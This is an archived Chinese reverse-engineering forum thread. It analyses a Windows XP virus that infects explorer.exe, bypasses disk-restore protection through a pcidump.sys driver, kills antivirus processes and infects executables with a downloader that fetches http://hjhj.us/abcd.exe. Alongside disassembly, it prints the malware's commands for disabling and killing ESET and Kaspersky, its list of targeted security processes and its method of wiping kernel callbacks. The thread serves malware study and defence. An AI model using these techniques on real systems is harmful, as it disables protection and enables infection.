
# 绕过 360 还原保护穿透冰点的样本

> 原文：[`www.pediy.com/kssd/pediy10/90248.html`](https://www.pediy.com/kssd/pediy10/90248.html)

今天搞一个被感染的系统文件，试着在真机运行了下，任务管理器里多了一些随机名字的进程名，`explorer.exe` 被感染，其他系统相关文件没有检测估计不止感染这一个。在每个盘符下都有 `autorun.inf` 和一个 `1.exe`。测试的系统为 xp sp2 和 xp sp3，其中 xp sp3 打全了官方公布的所有补丁。系统除了冰点 6.3.220.1875 和 360 还原保护 2.3.03 再没有其他防护软件。

希望有朋友能帮忙分析下这个病毒的原理![](img/022c916b9660e467a8663bd57a4ae6d1.jpg "狂笑")

**感谢**fixfix 在本贴 12 楼分离出病毒样本

**感谢**轩辕小聪在本贴 25 楼的分析，为我等小菜铺平了道路![](img/3e9367e5826886294bccbb08463f3e34.jpg "酷")

**感谢**木桩在本贴 35 楼对 `func.dll` 的分析，很详细呀![](img/3e9367e5826886294bccbb08463f3e34.jpg "酷")

**感谢**zhzhtst 提供了样本的 `idb` 文件帮助辅助分析

zhzhtst 效率太高了，佩服呀

`pcidump.sys` 和其它几个驱动的 `idb` 文件

[`bbs.pediy.com/showthread.php?t=90248`](http://bbs.pediy.com/showthread.php?t=90248)

**感谢**所有对本贴关注的朋友!

发这个帖子的初衷的想做一个 anti 的，从 ring3 下最简单的考虑，应该是创建一个互斥对象，病毒以为自己已经在运行了![](img/792ac17acdd6fd3e39fc1aacdcf4c3d9.jpg "124.gif")

小弟不才，还请各位大哥更深一层的指教![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || [`explorer.rar`](http://bbs.pediy.com/showpost.php?p=632771&postcount=1)  

 |

`pcidump` 可以穿透还原，`EsuDisk`，很长时间了。给出一个函数列表，想仔细分析的可以看看：

```
ATA_IDENTIFY_DEVICE
ATA_READ_SECTOR
ATA_WRITE_SECTOR
CanIdentifyDevice
CompareProcess
DbgPrint
DeviceIoControlRequest
DisableWriteProtect
DispatchCreateClose
DispatchDeviceControl
DoWrite
DriverEntry
FastFatDispatchCreateHook
FindPspTerminateProcess
GetClusterSizeAndBegin
GetDeviceObject
GetDeviceObjectByName
GetFileInfo
GetFileRetrievalPointers
GetFileSize
GetImageFileNameFieldOffset
GetObjectHeaderNameInfo
GetPartitionInfo
GetProcessImageName
GetPspTerminateProcess
GetRealDeviceObject
GetSectorInfo
HookFatFileSystem
HookFileSystem
HookNtfsFileSystem
HookZwQuerySystemInformation
IoCompletion
KeGetCurrentThread
MyMmGetSystemRoutineAddress
NtfsDispatchCreateHook
OpenFile
OpenFileSynchronize
PsGetCurrentProcessId
PsLookupProcessByProcessId
ReplaceFile
Reset
VerifyBootSector
VerifyNTFS
WriteSector
ZwQuerySystemInformationHook
__SEH_epilog
__SEH_prolog
_alldiv
_except_handler3
mysprintf
sprintf
```

`explorer.exe` 释放并加载了 `phpi.dll`，释放了 `func.dll`，使用 `rundll32.exe` 加载 `func.dll` 并调用其中的 `droqp` 函数。其他还有改系统时间等杂七杂八的动作。

`func.dll` 的 `droqp` 函数释放并加载驱动 `acpiec.sys`，驱动的主要目的：

1. 还原 `SSDT`

2. 接收 `func.dll` 传入的某些安全软件进程的 PID，并结束进程，使用的方法：
   `ZwOpenProcess` -> `ZwCreateJobObject` -> `ZwAssignProcessToJobObject` -> `ZwTerminateJobObject`

3. 对以下函数的代码进行特征搜索，搜索得到内核中回调函数表 `PspLoadImageNotifyRoutine`、`PspCreateProcessNotifyRoutine`、`PspCreateThreadNotifyRoutine` 的地址，将这三张表中的内容（每张表 8 个 `PVOID`）全部置 0，从而废掉安全软件使用以上方法进行进线程和模块加载监视的功能：
   - `PsRemoveLoadImageNotifyRoutine`
   - `PsSetCreateProcessNotifyRoutine`
   - `PsRemoveCreateThreadNotifyRoutine`

`phpi.dll` 被 `explorer.exe` 本身加载，调用其 `Scan` 函数，部分功能：

1. 判断自身进程是否是 `C:\WINDOWS\explorer.exe`：
   - 是则说明已经感染了，将 `system32\drivers\gm.dls` 复制到 `WINDOWS\temp\explorer.exe` 并运行，使得桌面正常出现
   - 不是则说明未感染，释放并加载 `pcidump.sys` 穿还原，复制原 `WINDOWS\explorer.exe` 到 `system32\drivers\gm.dls`，并将自身内容写入 `WINDOWS\explorer.exe` 头部达到修改该文件。创建一个线程捕捉系统文件保护的弹出对话框并关闭之。
   - 从这里可以看出，原来的 `WINDOWS\explorer.exe` 在被感染系统中被保存为 `system32\drivers\gm.dls`

2. 将自身资源中的文本释放，替换 `hosts` 文件

3. 创建几个线程，作用分别是：
   - 写入盘符根目录的 `autorun.inf` 和 `1.exe`
   - 向远程服务器地址放送被感染电脑的信息作为感染统计
   - 修改系统中的 `.htm` 及 `html` 文件加入恶意代码（这里没有仔细看加入代码的内容）
   - 感染系统中的 `.exe` 文件（跳过 `qq.exe` 和 `360safe.exe`），感染手法似乎是加入名为 `.hhqg` 的新区段写入病毒代码，代码为下载 `http://hjhj.us/abcd.exe` 到临时文件夹并调用 `WinExec` 运行之。

除了脱壳用 `OD` 之外，以上内容全是 `IDA` 静态分析，看得比较粗略，有错漏的请大家补充指正。

目前只看完 `func.dll`，大致了解了一下执行流程。驱动部分没想到都逆完了，我也把我分析的贴一下吧：

引用: **`explorer.exe`** 行为

```
; 创建互斥
004012D1   |.  56            PUSH ESI                         ; /MutexName => "ttt555"
004012D2   |.  53            PUSH EBX                         ; |InitialOwner => FALSE
004012D3   |.  53            PUSH EBX                         ; |pSecurity => NULL
004012D4   |.  FF15 24204000 CALL DWORD PTR DS:[<&KERNEL32.CreateMute>; \CreateMutexA

; 执行这几条命令（主要对付 ESET NOD32 ）
"cmd /c cacls %s /e /p everyone:f"
"cmd /c cacls "%s" /e /p everyone:f"
"cmd /c sc config ekrn start= disabled"                     ; ekrn.exe => "ESET NOD32"
"cmd /c taskkill /im ekrn.exe /f"
"cmd /c taskkill /im egui.exe /f"
"cmd /c taskkill /im ScanFrm.exe /f"                         ; Rising scan server

; 取资源 BIN，放出 func.dll
Res:"BIN"    "\system32\func.dll"
"rundll32.exe func.dll, droqp"

; 放 phpi.dll
...          "\phpi.dll"
...
```

`explorer.exe` 后面还有个释放 `phpi.dll` 的部分没看，先拆了 `func.dll`：

引用: **`func.dll`** （通过 `rundll32.exe func.dll, droqp` 执行）

```
.text:1000411C                public **droqp**
.text:1000411C droqp         proc near
; 提权
.text:10004128                call    SetDebugPrivilege

; 释放 acpiec.sys
.text:1000419D                lea     eax, [ebp+FileName]
.text:100041A3                push    offset aSystem32Driver  ; "\\system32\\drivers"
.text:100041A8                push    eax             ; Dest
.text:100041A9                call    strcat
.text:100041AE                lea     eax, [ebp+FileName]
.text:100041B4                push    offset aAcpiec_sys      ; "\\acpiec.sys"
.text:100041B9                push    eax             ; Dest
.text:100041BA                call    strcat
.text:100041BF                add     esp, 10h
.text:100041C2                cmp     [ebp+SystemTime.wYear], 7D8h
.text:100041C8                jbe     short loc_100041E0
.text:100041CA                lea     eax, [ebp+FileName]
.text:100041D0                push    eax             ; lpFileName
.text:100041D1                push    offset hFile        ; ResName = "SYS"
.text:100041D6                push    67h             ; hResInfo
.text:100041D8                call    Save_Res2File
; int __cdecl Save_Res2File(LPCSTR hResInfo, LPCSTR hFile, LPCSTR lpFileName)

; 注册 acpiec.sys 并加载
.text:100041E0                lea     eax, [ebp+FileName] ; "acpiec.sys"
.text:100041E6                push    eax             ; lpBinaryPathName
.text:100041E7                call    Load_driver_UPDATEDATA
.text:1000422B                push    [ebp+hDevice]   ; hDevice
.text:1000422E                call    something_about_SSDT

.text:10003FB1 ; int __cdecl something_about_SSDT(int hDevice)
.text:10003FB1 something_about_SSDT proc near
```

`func.dll` 关于 `SSDT` 部分，前面有人解释过了，无非就是取内核基址然后发 `IOCTL`

```
.text:10003E8B                push    22E14Bh         ; IOCTL 0x22E14B: 替换指定的 SSDT
```

ps: 不过作者写程序很中规中矩啊，该 Free 的 Free，该关句柄的关句柄，出错处理和调试信息一个不少，不像有些木马里 `LoadLibraryEx` 后就放那不管了。

; 接着打开 `\\.\CMusic`，也就是之前放出的那个驱动 `acpiec.sys`

```
.text:100041EF                push    ebx             ; hTemplateFile
.text:100041F0                 push    80h             ; dwFlagsAndAttributes
.text:100041F5                 push    3               ; dwCreationDisposition
.text:100041F7                 push    ebx             ; lpSecurityAttributes
.text:100041F8                 push    ebx             ; dwShareMode
.text:100041F9                 push    0C0000000h      ; dwDesiredAccess
.text:100041FE                 push    offset FileName ; "\\\.\CMusic"
.text:10004203                 call    ds:CreateFileA
```

; 创建一个线程在 `StartAddress`

```
.text:10004241                push    ebx             ; lpThreadId
.text:10004242                 push    ebx             ; dwCreationFlags
.text:10004243                 push    [ebp+lpParameter] ; lpParameter
.text:10004246                 push    offset StartAddress ; lpStartAddress
.text:1000424B                 push    ebx             ; dwStackSize
.text:1000424C                 push    ebx             ; lpThreadAttributes
.text:1000424D                 call    ds:CreateThread

.text:1000146B ; DWORD __stdcall StartAddress(LPVOID)
```



### 进程列表

.text:1000146B StartAddress proc near

; 一个巨长的函数，几乎把所有杀软进程名都给列上了

; 不过从这个列表的顺序来看，这八成是国人写的，瑞星、360 的进程都照顾全了，连 `QQ` 医生都没忘![](img/9d43c9aee695f95b024aafd1b69ffa5a.jpg "伤心")

`RsMain.exe`

`ScanFrm.exe`

`rsnetsvr.exe`

`avp.exe`

`safeboxTray.exe`

`360Safe.exe`

`360Safebox.exe`

`360tray.exe`

`antiarp.exe`

`ekrn.exe`

`egui.exe`

`RavMon.exe`

`RavMonD.exe`

`RavTask.exe`

`CCenter.exe`

`RavStub.exe`

`RsTray.exe`

`Rav.exe`

`Rsaupd.exe`

`AgentSvr.exe`

`QQDoctor.exe`

`DrRtp.exe`

`McProxy.exe`

`McNASvc.exe`

`Mcshield.exe`

`MpfSrv.exe`

`pccguide.exe`

`ZONEALARM.exe`

`zonealarm.exe`

...

### 驱动调用

; 接着发 `22E153` 到驱动（`IOCTL 0x22E153` 根据 `PID` 调用 `ZwTerminateJobObject` 结束指定进程）

```
.text:100035DB             mov     edi, ds:GetModuleHandleA
.text:100035E1             push    offset ModuleName ; "kernel32.dll"
.text:100035E6             call    edi ; GetModuleHandleA
.text:100035E8             push    offset aDeviceiocontro ; "DeviceIoControl"
.text:100035ED             push    eax         ; hModule
.text:100035EE             call    ds:GetProcAddress
.text:100035F4             mov     [ebp+DeviceIoControl_addr], eax

.text:10003AE5             lea     eax, [ebp+dwProcessID]
.text:10003AE8             push    4
.text:10003AEA             push    eax
.text:10003AEB             push    22E153h      ; IOCTL
.text:10003AF0             push    dword ptr [ebp+8]
.text:10003AF3             call    [ebp+DeviceIoControl_addr]

.text:10003B07 loc_10003B07:                         ; CODE XREF: StartAddress+2226j
.text:10003B07             push    [ebp+pe.th32ProcessID] ; dwProcessId
.text:10003B0D             call    kill_avp
```

; 关进程

; 嘿嘿，在 `SOFTWARE\KasperskyLab\protected\AVP8\CKAHUM\LastSet` 里找卡巴的病毒库路径

### `kill_avp` 函数

```
.text:1000132B ; int __cdecl kill_avp(DWORD dwProcessId)
.text:1000132B kill_avp         proc near
.text:10001339                 push    edi
.text:1000133A                 push    eax         ; phkResult
.text:1000133B                 xor     esi, esi
.text:1000133D                 push    20019h        ; samDesired
.text:10001342                 push    esi         ; ulOptions
.text:10001343                 push    offset SubKey   ; "SOFTWARE\KasperskyLab\protected\AVP8\CKAHUM\LastSet"
.text:10001348                 push    80000002h       ; hKey
.text:1000134D                 call    ds:RegOpenKeyExA

.text:10001365                 push    eax         ; lpcbData
.text:10001366                 lea     eax, [ebp+Data]
.text:1000136C                 push    eax         ; lpData
.text:1000136D                 lea     eax, [ebp+Type]
.text:10001370                 push    eax         ; lpType
.text:10001371                 push    esi         ; lpReserved
.text:10001372                 push    offset ValueName ; "Directory"
.text:10001377                 mov     [ebp+cbData], 50h
.text:1000137E                 push    [ebp+hKey]      ; hKey
.text:10001381                 call    ds:RegQueryValueExA
```

; 执行下面两个命令

```
.text:1000145B                 call    esi ; WinExec
"cmd /c sc config avp start= disabled"
"cmd /c taskkill /f /im avp.exe"
```

; 然后继续循环

...

### 分析与附件

显然这个 `func.dll` 只是用于 K 掉杀毒软件的。唯一值得关注的就是那个进程列表，看来作者相当厌恶瑞\*啊，几乎所有的进程都给列上了...

以及 `acpiec.sys` 里那个 `pdb` 的路径名，

```
.rdata:0001283C db 'E:\ts\benz_5-15\SYS\objfre\i386\KILLKB.pdb',0
```

作者还是赶快把 `E` 盘格了，然后给 `DDK` 换个文件夹，免得哪天被人看到而东窗事发![](img/c72cb8eba397ac67dda6e1ac58a9b627.jpg "微笑")

`http://bbs.pediy.com/showthread.php?t=90185`

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) |
| :--- |
| `pcidump.rar` \[请到论坛下载：[`bbs.pediy.com/showthread.php?t=90248`](http://bbs.pediy.com/showthread.php?t=90248)\] |
